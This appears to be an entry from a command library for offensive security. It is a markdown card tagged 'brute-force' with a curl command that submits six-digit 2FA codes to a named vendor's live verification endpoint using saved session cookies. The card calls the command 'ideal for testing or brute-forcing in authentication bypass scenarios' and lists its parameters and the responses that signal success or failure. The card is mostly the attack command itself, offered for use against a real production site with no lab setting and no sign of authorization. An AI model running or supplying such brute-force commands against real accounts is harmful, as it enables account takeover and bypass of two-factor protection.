---
data: >-
  curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=123456"
  -v
tags:
  - brute-force
  - web
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 39357050-ff54-46d2-bb88-07735a1bce35
created_at: '2025-12-14T17:31:19.770Z'
updated_at: '2025-12-14T17:31:19.770Z'
verified: false
validated: true
submitted: true
---
# curl-ubnt-2fa-submit

## Command

```bash
curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=123456" -v
```

## Description

This command submits a 2FA code to Ubiquiti's verification endpoint using session cookies. Ideal for testing or brute-forcing in authentication bypass scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-b cookies.txt` | Loads cookies from file | Yes |
| `-d` | Data payload with 6-digit code | Yes |
| `-v` | Verbose output for response analysis | No |

## Examples

### Basic Usage

```bash
curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=123456"
```

### Advanced Usage

```bash
curl -X POST https://www.ubnt.com/verify-2fa -b cookies.txt -d "code=123456" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

On failure: HTTP 401 or error JSON like {"error": "invalid_code"}. On success: 200 with redirect or {"status": "authenticated"}.

## Related

- [[Related Procedure]]
